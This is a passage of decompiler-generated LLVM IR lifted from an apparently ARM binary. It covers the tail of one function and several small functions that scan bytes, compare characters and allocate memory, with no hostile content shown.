  store i32 %v1_f9d0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f9d4

dec_label_pc_f9d4thread-pre-split:                ; preds = %dec_label_pc_f9a8
  %v2_f9b4 = inttoptr i32 %v3_f9a8 to i8*
  %v3_f9b4 = load i8, i8* %v2_f9b4, align 1
  %v4_f9b4 = zext i8 %v3_f9b4 to i32
  store i32 %v4_f9b4, i32* %r0.global-to-local, align 4
  %v6_f9b4 = add i32 %v3_f9a8, 1
  store i32 %v6_f9b4, i32* %r2.global-to-local, align 4
  store i32 %v6_f9b4, i32* %v2_f9a8, align 4
  %v0_f9d4.pr = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f9d4

dec_label_pc_f9d4:                                ; preds = %dec_label_pc_f9d4thread-pre-split, %dec_label_pc_f9c0, %dec_label_pc_f9cc
  %v1_f9d8 = phi i32 [ %v0_f9d4.pr, %dec_label_pc_f9d4thread-pre-split ], [ %v2_f9c4, %dec_label_pc_f9c0 ], [ %v1_f9d0, %dec_label_pc_f9cc ]
  %v7_f9d4 = icmp eq i32 %v1_f9d8, 10
  store i1 %v7_f9d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f9d4, label %dec_label_pc_f9e0.loopexit, label %bb66

bb66:                                             ; preds = %dec_label_pc_f9d4
  %v8_f9d8 = icmp eq i32 %v1_f9d8, -1
  store i1 %v8_f9d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f9d8, label %dec_label_pc_f9e0.loopexit, label %.dec_label_pc_f998_crit_edge

.dec_label_pc_f998_crit_edge:                     ; preds = %bb66
  %v0_f998.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_f998

dec_label_pc_f9e0.loopexit:                       ; preds = %bb66, %dec_label_pc_f9d4
  %v0_f9e0.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_f9e0

dec_label_pc_f9e0:                                ; preds = %dec_label_pc_f938, %dec_label_pc_f9e0.loopexit
  %v0_f9e0 = phi i32 [ %v0_f9e0.pre, %dec_label_pc_f9e0.loopexit ], [ %v1_f94c, %dec_label_pc_f938 ]
  %v7_f9e0 = icmp eq i32 %v0_f9e0, -1
  store i1 %v7_f9e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f9e0, label %dec_label_pc_fb28, label %dec_label_pc_f9e8

dec_label_pc_f9e8:                                ; preds = %dec_label_pc_f9e0
  store i32 %v1_f850, i32* %r3.global-to-local, align 4
  store i1 %v2_f9ec, i1* %cpsr_z.global-to-local, align 1
  %v0_f9f0 = load i32, i32* @r5, align 4
  %v1_f9f0 = add i32 %v0_f9f0, 12
  %v2_f9f0 = inttoptr i32 %v1_f9f0 to i32*
  %v3_f9f0 = load i32, i32* %v2_f9f0, align 4
  store i32 %v3_f9f0, i32* @r4, align 4
  br i1 %v2_f9ec, label %dec_label_pc_fa08, label %dec_label_pc_f9f8

dec_label_pc_f9f8:                                ; preds = %dec_label_pc_f9e8
  store i32 %v3_f9f0, i32* @r0, align 4
  %v0_f9fc = load i32, i32* @sl, align 4
  %v2_fa00 = inttoptr i32 %v3_f9f0 to i8*
  %v3_fa00 = call i32 @function_11790(i8* %v2_fa00, i32 %v0_f9fc)
  store i32 %v3_fa00, i32* %r0.global-to-local, align 4
  %v0_fa04 = load i32, i32* @r4, align 4
  %v2_fa04 = add i32 %v0_fa04, %v3_fa00
  store i32 %v2_fa04, i32* @r4, align 4
  br label %dec_label_pc_fa08

dec_label_pc_fa08:                                ; preds = %dec_label_pc_f9e8, %dec_label_pc_f9f8
  %v0_fa08 = phi i32 [ %v3_f9f0, %dec_label_pc_f9e8 ], [ %v2_fa04, %dec_label_pc_f9f8 ]
  %v1_fa08 = inttoptr i32 %v0_fa08 to i8*
  %v2_fa08 = load i8, i8* %v1_fa08, align 1
  %v3_fa08 = zext i8 %v2_fa08 to i32
  store i32 %v3_fa08, i32* %r2.global-to-local, align 4
  %v2_fa0c = icmp eq i8 %v2_fa08, 0
  store i1 %v2_fa0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fa0c, label %dec_label_pc_f878.backedge, label %dec_label_pc_fa14

dec_label_pc_f878.backedge:                       ; preds = %dec_label_pc_fa08, %dec_label_pc_fa14, %dec_label_pc_fb20
  %v0_f878.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_f878

dec_label_pc_fa14:                                ; preds = %dec_label_pc_fa08
  %v0_fa14 = load i32, i32* @r7, align 4
  %v1_fa14 = inttoptr i32 %v0_fa14 to i8*
  %v2_fa14 = load i8, i8* %v1_fa14, align 1
  %v3_fa14 = zext i8 %v2_fa14 to i32
  store i32 %v3_fa14, i32* %r3.global-to-local, align 4
  %v9_fa18 = icmp eq i8 %v2_fa14, %v2_fa08
  store i1 %v9_fa18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_fa18, label %dec_label_pc_f878.backedge, label %dec_label_pc_fa20

dec_label_pc_fa20:                                ; preds = %dec_label_pc_fa14
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v0_fa24 = load i32, i32* @r5, align 4
  %v1_fa24 = add i32 %v0_fa24, 4
  %v2_fa24 = inttoptr i32 %v1_fa24 to i32*
  %v3_fa24 = load i32, i32* %v2_fa24, align 4
  store i32 %v3_fa24, i32* %r0.global-to-local, align 4
  %v0_fa28 = load i32, i32* @fp, align 4
  store i32 %v3_fa24, i32* %v1_fa44, align 4
  store i32 %v3_f83c, i32* %r2.global-to-local, align 4
  %v3_fa34 = inttoptr i32 %v3_fa24 to i8*
  %v4_fa34 = call i32 @function_bff0(i8* %v3_fa34, i32 %v0_fa28, i32 %v3_f83c)
  store i32 %v4_fa34, i32* %r0.global-to-local, align 4
  %v0_fa38 = load i32, i32* @fp, align 4
  store i32 %v0_fa38, i32* @r6, align 4
  %v0_faf812 = load i32, i32* @r4, align 4
  %v1_faf813 = inttoptr i32 %v0_faf812 to i8*
  %v2_faf814 = load i8, i8* %v1_faf813, align 1
  %v3_faf815 = zext i8 %v2_faf814 to i32
  store i32 %v3_faf815, i32* %r2.global-to-local, align 4
  %v2_fafc16 = icmp eq i8 %v2_faf814, 0
  store i1 %v2_fafc16, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fafc16, label %dec_label_pc_fb14, label %dec_label_pc_fb04

dec_label_pc_fa40:                                ; preds = %bb72
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v2_fa44 = load i32, i32* %v1_fa44, align 4
  store i32 %v2_fa44, i32* %r3.global-to-local, align 4
  store i32 %v1_f854, i32* %r2.global-to-local, align 4
  %v9_fa4c = icmp eq i32 %v2_fa50, %v1_f854
  store i1 %v9_fa4c, i1* %cpsr_z.global-to-local, align 1
  %v5_fa50 = mul i32 %v2_fa50, 4
  %v6_fa50 = add i32 %v2_fa44, %v5_fa50
  %v7_fa50 = inttoptr i32 %v6_fa50 to i32*
  store i32 %v0_fa50, i32* %v7_fa50, align 4
  br i1 %v9_fa4c, label %dec_label_pc_fa58, label %dec_label_pc_fa64

dec_label_pc_fa58:                                ; preds = %dec_label_pc_fa40
  store i32 %v1_f860, i32* %r3.global-to-local, align 4
  store i1 %v2_fa5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fa5c, label %dec_label_pc_fa64, label %dec_label_pc_fa84

dec_label_pc_fa64:                                ; preds = %dec_label_pc_fa58, %dec_label_pc_fa40
  %v0_fa64 = load i32, i32* @r7, align 4
  %v1_fa64 = inttoptr i32 %v0_fa64 to i8*
  %v2_fa64 = load i8, i8* %v1_fa64, align 1
  %v3_fa64 = zext i8 %v2_fa64 to i32
  store i32 %v3_fa64, i32* %r3.global-to-local, align 4
  %v2_fa68 = icmp eq i8 %v2_fa64, 0
  store i1 %v2_fa68, i1* %cpsr_z.global-to-local, align 1
  %v0_fa6c = load i32, i32* @r4, align 4
  store i32 %v0_fa6c, i32* @r0, align 4
  %v1_fa70 = load i32, i32* @sl, align 4
  %storemerge = select i1 %v2_fa68, i32 %v1_fa70, i32 %v0_fa64
  store i32 %storemerge, i32* @r1, align 4
  %v0_fa78 = call i32 @function_116fc()
  store i32 %v0_fa78, i32* %r0.global-to-local, align 4
  %v0_fa7c = load i32, i32* @r4, align 4
  %v2_fa7c = add i32 %v0_fa7c, %v0_fa78
  store i32 %v2_fa7c, i32* @r4, align 4
  br label %dec_label_pc_fabc

dec_label_pc_fa84:                                ; preds = %dec_label_pc_fa58
  %v0_fa84 = load i32, i32* @r4, align 4
  store i32 %v0_fa84, i32* @r0, align 4
  %v0_fa88 = load i32, i32* @r7, align 4
  %v1_fa88 = inttoptr i32 %v0_fa88 to i8*
  %v2_fa88 = load i8, i8* %v1_fa88, align 1
  %v3_fa88 = zext i8 %v2_fa88 to i32
  %v5_fa8c = call i32 @function_11610(i32 %v0_fa84, i32 %v3_fa88, i32 %v1_f854, i32 %v1_f860)
  store i32 %v5_fa8c, i32* %r0.global-to-local, align 4
  store i32 %v1_f850, i32* %r2.global-to-local, align 4
  store i1 %v2_f9ec, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_fa8c, i32* @r4, align 4
  br i1 %v2_f9ec, label %dec_label_pc_fabc, label %dec_label_pc_faa8

dec_label_pc_faa4:                                ; preds = %dec_label_pc_faa8
  %v1_faa4 = add i32 %v0_fabc.pre, -1
  store i32 %v1_faa4, i32* @r4, align 4
  br label %dec_label_pc_faa8

dec_label_pc_faa8:                                ; preds = %dec_label_pc_fa84, %dec_label_pc_faa4
  %v0_faa8 = phi i32 [ %v1_faa4, %dec_label_pc_faa4 ], [ %v5_fa8c, %dec_label_pc_fa84 ]
  %v1_faa8 = add i32 %v0_faa8, -1
  %v2_faa8 = inttoptr i32 %v1_faa8 to i8*
  %v3_faa8 = load i8, i8* %v2_faa8, align 1
  %v4_faa8 = zext i8 %v3_faa8 to i32
  %v0_faac = load i32, i32* @sl, align 4
  store i32 %v0_faac, i32* @r0, align 4
  %v2_fab0 = call i32 @function_11520(i32 %v0_faac, i32 %v4_faa8)
  store i32 %v2_fab0, i32* %r0.global-to-local, align 4
  %v2_fab4 = icmp eq i32 %v2_fab0, 0
  store i1 %v2_fab4, i1* %cpsr_z.global-to-local, align 1
  %v0_fabc.pre = load i32, i32* @r4, align 4
  br i1 %v2_fab4, label %dec_label_pc_fabc, label %dec_label_pc_faa4

dec_label_pc_fabc:                                ; preds = %dec_label_pc_faa8, %dec_label_pc_fa84, %dec_label_pc_fa64
  %v3_fac8 = phi i32 [ %v5_fa8c, %dec_label_pc_fa84 ], [ %v2_fa7c, %dec_label_pc_fa64 ], [ %v0_fabc.pre, %dec_label_pc_faa8 ]
  %v1_fabc = inttoptr i32 %v3_fac8 to i8*
  %v2_fabc = load i8, i8* %v1_fabc, align 1
  %v3_fabc = zext i8 %v2_fabc to i32
  store i32 %v3_fabc, i32* %r2.global-to-local, align 4
  %v0_fac0 = load i32, i32* @r7, align 4
  %v1_fac0 = inttoptr i32 %v0_fac0 to i8*
  %v2_fac0 = load i8, i8* %v1_fac0, align 1
  %v3_fac0 = zext i8 %v2_fac0 to i32
  store i32 %v3_fac0, i32* %r3.global-to-local, align 4
  %v9_fac4 = icmp eq i8 %v2_fac0, %v2_fabc
  store i1 %v9_fac4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_fac4, label %bb69, label %dec_label_pc_fad0

bb69:                                             ; preds = %dec_label_pc_fabc
  %v1_fac8 = load i32, i32* @fp, align 4
  %v2_fac8 = trunc i32 %v1_fac8 to i8
  store i8 %v2_fac8, i8* %v1_fabc, align 1
  %v0_facc.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_facc.pr, label %bb71, label %.dec_label_pc_fad0_crit_edge

.dec_label_pc_fad0_crit_edge:                     ; preds = %bb69
  %v0_fad0.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_fad0

dec_label_pc_fad0:                                ; preds = %.dec_label_pc_fad0_crit_edge, %dec_label_pc_fabc
  %v0_fad0 = phi i32 [ %v0_fad0.pre, %.dec_label_pc_fad0_crit_edge ], [ %v3_fabc, %dec_label_pc_fabc ]
  %v2_fad0 = icmp eq i32 %v0_fad0, 0
  store i1 %v2_fad0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fad0, label %bb71, label %bb70

bb70:                                             ; preds = %dec_label_pc_fad0
  %v1_fad4 = load i32, i32* @fp, align 4
  %v2_fad4 = trunc i32 %v1_fad4 to i8
  %v3_fad4 = load i32, i32* @r4, align 4
  %v4_fad4 = inttoptr i32 %v3_fad4 to i8*
  store i8 %v2_fad4, i8* %v4_fad4, align 1
  %v5_fad4 = load i32, i32* @r4, align 4
  %v6_fad4 = add i32 %v5_fad4, 1
  store i32 %v6_fad4, i32* @r4, align 4
  br label %bb71

bb71:                                             ; preds = %bb69, %dec_label_pc_fad0, %bb70
  %v2_fad8 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_fad8, i32* %r3.global-to-local, align 4
  %v2_fadc = icmp eq i32 %v2_fad8, 0
  store i1 %v2_fadc, i1* %cpsr_z.global-to-local, align 1
  %v0_faf8.pre = load i32, i32* @r4, align 4
  br i1 %v2_fadc, label %dec_label_pc_faf4, label %dec_label_pc_fae4

dec_label_pc_fae4:                                ; preds = %bb71
  store i32 %v0_faf8.pre, i32* @r0, align 4
  %v0_fae8 = load i32, i32* @sl, align 4
  %v2_faec = inttoptr i32 %v0_faf8.pre to i8*
  %v3_faec = call i32 @function_11790(i8* %v2_faec, i32 %v0_fae8)
  store i32 %v3_faec, i32* %r0.global-to-local, align 4
  %v0_faf0 = load i32, i32* @r4, align 4
  %v2_faf0 = add i32 %v0_faf0, %v3_faec
  store i32 %v2_faf0, i32* @r4, align 4
  br label %dec_label_pc_faf4

dec_label_pc_faf4:                                ; preds = %bb71, %dec_label_pc_fae4
  %v0_faf8 = phi i32 [ %v2_faf0, %dec_label_pc_fae4 ], [ %v0_faf8.pre, %bb71 ]
  %v0_faf4 = load i32, i32* @r6, align 4
  %v1_faf4 = add i32 %v0_faf4, 1
  store i32 %v1_faf4, i32* @r6, align 4
  %v1_faf8 = inttoptr i32 %v0_faf8 to i8*
  %v2_faf8 = load i8, i8* %v1_faf8, align 1
  %v3_faf8 = zext i8 %v2_faf8 to i32
  store i32 %v3_faf8, i32* %r2.global-to-local, align 4
  %v2_fafc = icmp eq i8 %v2_faf8, 0
  store i1 %v2_fafc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fafc, label %dec_label_pc_fb14, label %dec_label_pc_fb04

dec_label_pc_fb04:                                ; preds = %dec_label_pc_fa20, %dec_label_pc_faf4
  %v0_fa50 = phi i32 [ %v0_faf8, %dec_label_pc_faf4 ], [ %v0_faf812, %dec_label_pc_fa20 ]
  %v2_fa50 = phi i32 [ %v1_faf4, %dec_label_pc_faf4 ], [ %v0_fa38, %dec_label_pc_fa20 ]
  %v1_fb08 = phi i32 [ %v3_faf8, %dec_label_pc_faf4 ], [ %v3_faf815, %dec_label_pc_fa20 ]
  %v0_fb04 = load i32, i32* @r7, align 4
  %v1_fb04 = inttoptr i32 %v0_fb04 to i8*
  %v2_fb04 = load i8, i8* %v1_fb04, align 1
  %v3_fb04 = zext i8 %v2_fb04 to i32
  store i32 %v3_fb04, i32* %r3.global-to-local, align 4
  %v9_fb08 = icmp eq i32 %v3_fb04, %v1_fb08
  store i1 %v9_fb08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_fb08, label %dec_label_pc_fb14, label %bb72

bb72:                                             ; preds = %dec_label_pc_fb04
  %v2_fb0c = load i32, i32* @sb, align 4
  %v3_fb0c = sub i32 %v2_fa50, %v2_fb0c
  %v5_fb0c = xor i32 %v2_fb0c, %v2_fa50
  %v6_fb0c = xor i32 %v3_fb0c, %v2_fa50
  %v7_fb0c = and i32 %v6_fb0c, %v5_fb0c
  %v8_fb0c = icmp slt i32 %v7_fb0c, 0
  %v9_fb0c = icmp slt i32 %v3_fb0c, 0
  %v10_fb0c = icmp eq i32 %v2_fa50, %v2_fb0c
  store i1 %v10_fb0c, i1* %cpsr_z.global-to-local, align 1
  %v2_fb10 = xor i1 %v9_fb0c, %v8_fb0c
  br i1 %v2_fb10, label %dec_label_pc_fa40, label %dec_label_pc_fb14

dec_label_pc_fb14:                                ; preds = %dec_label_pc_fb04, %dec_label_pc_faf4, %bb72, %dec_label_pc_fa20
  %v0_fb18 = phi i32 [ %v0_fa38, %dec_label_pc_fa20 ], [ %v2_fa50, %dec_label_pc_fb04 ], [ %v1_faf4, %dec_label_pc_faf4 ], [ %v2_fa50, %bb72 ]
  store i32 %v3_f838, i32* %r2.global-to-local, align 4
  %v9_fb18 = icmp eq i32 %v0_fb18, %v3_f838
  store i1 %v9_fb18, i1* %cpsr_z.global-to-local, align 1
  %v6_fb1c = icmp slt i32 %v0_fb18, %v3_f838
  br i1 %v6_fb1c, label %dec_label_pc_fb20, label %dec_label_pc_fb2c

dec_label_pc_fb20:                                ; preds = %dec_label_pc_fb14
  %v0_fb20 = load i32, i32* @r8, align 4
  %v1_fb20 = and i32 %v0_fb20, 1048576
  %v2_fb20 = icmp eq i32 %v1_fb20, 0
  store i1 %v2_fb20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fb20, label %dec_label_pc_f878.backedge, label %dec_label_pc_fb28

dec_label_pc_fb28:                                ; preds = %dec_label_pc_fb20, %dec_label_pc_f9e0, %.thread, %dec_label_pc_f814
  br label %dec_label_pc_fb2c

dec_label_pc_fb2c:                                ; preds = %dec_label_pc_fb14, %dec_label_pc_f8fc, %dec_label_pc_fb28
  %v0_fb2c = phi i32 [ %v0_f90c, %dec_label_pc_f8fc ], [ 0, %dec_label_pc_fb28 ], [ %v0_fb18, %dec_label_pc_fb14 ]
  store i32 %v0_fb2c, i32* %r0.global-to-local, align 4
  store i32 %v3_f814, i32* @r4, align 4
  store i32 %v6_f814, i32* @r5, align 4
  store i32 %v9_f814, i32* @r6, align 4
  store i32 %v12_f814, i32* @r7, align 4
  store i32 %v15_f814, i32* @r8, align 4
  store i32 %v18_f814, i32* @sb, align 4
  store i32 %v21_f814, i32* @sl, align 4
  store i32 %v24_f814, i32* @fp, align 4
  ret i32 %v0_fb2c

; uselistorder directives
  uselistorder i32 %v0_fb2c, { 1, 0 }
  uselistorder i32 %v0_fb18, { 0, 2, 1 }
  uselistorder i32 %v3_fb0c, { 1, 0 }
  uselistorder i32 %v2_fb0c, { 1, 0, 2 }
  uselistorder i32 %v2_fa50, { 0, 1, 7, 2, 3, 6, 5, 4 }
  uselistorder i32 %v0_faf8.pre, { 0, 2, 1 }
  uselistorder i32 %v5_fa8c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_fa38, { 1, 0, 2 }
  uselistorder i1 %v9_fa18, { 1, 0 }
  uselistorder i32 %v3_f9f0, { 0, 2, 1, 3 }
  uselistorder i1 %v7_f9e0, { 1, 0 }
  uselistorder i1 %v8_f9d8, { 1, 0 }
  uselistorder i32 %v3_f9a8, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_f998, { 3, 2, 0, 1, 4, 5, 6, 7 }
  uselistorder i32 %v3_f980, { 1, 0, 2 }
  uselistorder i32 %v1_f970, { 1, 0, 2 }
  uselistorder i32 %v0_f95c, { 0, 2, 1, 3 }
  uselistorder i32 %v1_f954, { 1, 0 }
  uselistorder i32 %v1_f940, { 1, 0 }
  uselistorder i32 %v1_f93c, { 1, 0 }
  uselistorder i32 %v1_f8fc, { 2, 0, 1 }
  uselistorder i32 %v0_f8e4, { 1, 0 }
  uselistorder i32 %v1_f8d4, { 0, 2, 1 }
  uselistorder i32* %v1_fa44, { 1, 0 }
  uselistorder i1 %v2_f9ec, { 1, 0, 2, 3 }
  uselistorder i32 %v1_f860, { 2, 0, 1, 3 }
  uselistorder i32 %v1_f854, { 2, 1, 0 }
  uselistorder i32 %v3_f83c, { 1, 2, 0 }
  uselistorder i32 %v3_f838, { 2, 1, 0 }
  uselistorder i32 %v1_f830, { 2, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 7, 2, 3, 4, 5, 6, 18, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 23, 24, 6, 5, 25, 8, 9, 26, 7, 27, 10, 28, 11, 12, 13, 16, 14, 15, 1, 17, 18, 19, 22, 20, 21, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 11, 12, 13, 2, 3, 4, 5, 6, 7, 8, 9, 10, 32, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i32 1048576, { 2, 1, 0, 3 }
  uselistorder i32 (i32)* @function_114c0, { 1, 0 }
  uselistorder i32 %arg3, { 3, 4, 2, 0, 1, 5, 6 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_fb2c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_fb14, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_fb04, { 1, 0 }
  uselistorder label %dec_label_pc_faf4, { 1, 0 }
  uselistorder label %bb71, { 2, 1, 0 }
  uselistorder label %dec_label_pc_faa8, { 1, 0 }
  uselistorder label %dec_label_pc_f878.backedge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_fa08, { 1, 0 }
  uselistorder label %dec_label_pc_f9e0, { 1, 0 }
  uselistorder label %dec_label_pc_f9d4, { 0, 2, 1 }
  uselistorder label %dec_label_pc_f998, { 1, 0 }
  uselistorder label %dec_label_pc_f8cc, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb64, { 1, 0 }
}

define i32 @function_fb3c(i32* %arg1) local_unnamed_addr {
dec_label_pc_fb3c:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r4, align 4
  %v2_fb40 = icmp eq i32* %arg1, null
  br i1 %v2_fb40, label %dec_label_pc_fb68, label %dec_label_pc_fb48

dec_label_pc_fb48:                                ; preds = %dec_label_pc_fb3c
  %v2_fb48 = load i32, i32* %arg1, align 4
  %v1_fb4c = inttoptr i32 %v2_fb48 to i16*
  %v2_fb4c = call i32 @function_fbb8(i16* %v1_fb4c)
  %v0_fb50 = load i32, i32* @r4, align 4
  %v1_fb50 = add i32 %v0_fb50, 20
  %v2_fb50 = inttoptr i32 %v1_fb50 to i32*
  %v3_fb50 = load i32, i32* %v2_fb50, align 4
  %v2_fb54 = icmp eq i32 %v3_fb50, 0
  br i1 %v2_fb54, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_fb48
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_fb48, %bb
  store i32 64352, i32* @lr, align 4
  %v1_fb5c = xor i1 %v2_fb54, true
  call void @__pseudo_cond_branch(i1 %v1_fb5c, i32 ptrtoint (i32* @global_var_d458.137 to i32))
  %v0_fb60 = load i32, i32* @r4, align 4
  store i32 %v0_fb60, i32* @r0, align 4
  %v0_fb64 = call i32 @function_d458()
  br label %dec_label_pc_fb68

dec_label_pc_fb68:                                ; preds = %dec_label_pc_fb3c, %bb6
  %v1_fb6c = phi i32 [ 0, %dec_label_pc_fb3c ], [ %v0_fb64, %bb6 ]
  ret i32 %v1_fb6c

; uselistorder directives
  uselistorder label %dec_label_pc_fb68, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @function_fb70(i32 %arg1) local_unnamed_addr {
dec_label_pc_fb70:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_fb7c = load i32, i32* @r4, align 4
  store i32 %v3_fb7c, i32* %stack_var_-8, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 -37704), i32* @r1, align 4
  %v0_fb84 = call i32 @function_fee8()
  store i32 %v0_fb84, i32* %r0.global-to-local, align 4
  store i32 %v0_fb84, i32* @r4, align 4
  %v2_fb88 = icmp eq i32 %v0_fb84, 0
  br i1 %v2_fb88, label %bb, label %dec_label_pc_fb94

bb:                                               ; preds = %dec_label_pc_fb70
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_fb94:                                ; preds = %dec_label_pc_fb70
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_fb9c = call i32 @function_d0b4(i32 1, i32 24)
  store i32 %v2_fb9c, i32* %r0.global-to-local, align 4
  %v2_fba0 = icmp eq i32 %v2_fb9c, 0
  br i1 %v2_fba0, label %bb5, label %bb4

bb4:                                              ; preds = %dec_label_pc_fb94
  %v1_fba4 = load i32, i32* @r4, align 4
  %v3_fba4 = inttoptr i32 %v2_fb9c to i32*
  store i32 %v1_fba4, i32* %v3_fba4, align 4
  %v1_fbac.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %bb, %dec_label_pc_fb94, %bb4
  %v1_fbac = phi i32 [ 0, %bb ], [ 0, %dec_label_pc_fb94 ], [ %v1_fbac.pre, %bb4 ]
  %v2_fba8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_fba8, i32* @r4, align 4
  ret i32 %v1_fbac

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 3, 1, 0, 4 }
  uselistorder i32 (i32, i32)* @function_d0b4, { 5, 0, 4, 2, 1, 3 }
  uselistorder label %bb5, { 2, 1, 0 }
}

define i32 @function_fbb8(i16* %arg1) local_unnamed_addr {
dec_label_pc_fbb8:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_fbb8 = load i32, i32* @r4, align 4
  store i32 %v3_fbb8, i32* %stack_var_-36, align 4
  %v6_fbb8 = load i32, i32* @r5, align 4
  %v9_fbb8 = load i32, i32* @r6, align 4
  %v12_fbb8 = load i32, i32* @r7, align 4
  %v2_fbbc = add i32 %tmp, 52
  %v3_fbbc = inttoptr i32 %v2_fbbc to i32*
  %v4_fbbc = load i32, i32* %v3_fbbc, align 4
  store i32 %v4_fbbc, i32* %sb.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fbc4 = icmp eq i32 %v4_fbbc, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32* @r8, align 4
  br i1 %v2_fbc4, label %dec_label_pc_fbd8, label %dec_label_pc_fc3c

dec_label_pc_fbd8:                                ; preds = %dec_label_pc_fbb8
  %v0_fbd8 = call i32 @function_f150()
  store i32 %v0_fbd8, i32* %r0.global-to-local, align 4
  %v0_fbdc = load i32, i32* @r5, align 4
  %v1_fbdc = add i32 %v0_fbdc, 64
  %v2_fbdc = inttoptr i32 %v1_fbdc to i32*
  %v3_fbdc = load i32, i32* %v2_fbdc, align 4
  store i32 %v3_fbdc, i32* %r3.global-to-local, align 4
  %v1_fbe0 = add i32 %v0_fbd8, -1168
  store i32 %v1_fbe0, i32* @r6, align 4
  %v3_fbe4 = icmp uge i32 %v3_fbdc, %v1_fbe0
  store i1 %v3_fbe4, i1* %cpsr_c.global-to-local, align 1
  %v9_fbe4 = icmp eq i32 %v3_fbdc, %v1_fbe0
  br i1 %v9_fbe4, label %dec_label_pc_fc30, label %dec_label_pc_fbec

dec_label_pc_fbec:                                ; preds = %dec_label_pc_fbd8
  %v1_fbec = add i32 %v0_fbdc, 56
  store i32 %v1_fbec, i32* @r7, align 4
  store i32 1, i32* @r1, align 4
  store i32 %v1_fbec, i32* %r2.global-to-local, align 4
  %v0_fbf8 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_fbf8, i32* @r4, align 4
  %v1_fbfc115 = inttoptr i32 %v1_fbec to i32*
  %v2_fbfc116 = load i32, i32* %v1_fbfc115, align 4
  store i32 %v2_fbfc116, i32* %r3.global-to-local, align 4
  %v3_fc00118 = icmp uge i32 %v2_fbfc116, %v0_fbf8
  store i1 %v3_fc00118, i1* %cpsr_c.global-to-local, align 1
  %v9_fc00124 = icmp eq i32 %v2_fbfc116, %v0_fbf8
  br i1 %v9_fc00124, label %dec_label_pc_fc08, label %dec_label_pc_fc20

dec_label_pc_fc08:                                ; preds = %dec_label_pc_fbec, %dec_label_pc_fc08.dec_label_pc_fbfc_crit_edge
  %v0_fc08125 = phi i32 [ %v1_fc00.pre, %dec_label_pc_fc08.dec_label_pc_fbfc_crit_edge ], [ %v0_fbf8, %dec_label_pc_fbec ]
  store i32 %v0_fc08125, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_fc18 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_fc18, label %dec_label_pc_fc1c, label %dec_label_pc_fc08.dec_label_pc_fbfc_crit_edge

dec_label_pc_fc08.dec_label_pc_fbfc_crit_edge:    ; preds = %dec_label_pc_fc08
  %v0_fbfc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_fc00.pre = load i32, i32* @r4, align 4
  %v1_fbfc = inttoptr i32 %v0_fbfc.pre to i32*
  %v2_fbfc = load i32, i32* %v1_fbfc, align 4
  store i32 %v2_fbfc, i32* %r3.global-to-local, align 4
  %v3_fc00 = icmp uge i32 %v2_fbfc, %v1_fc00.pre
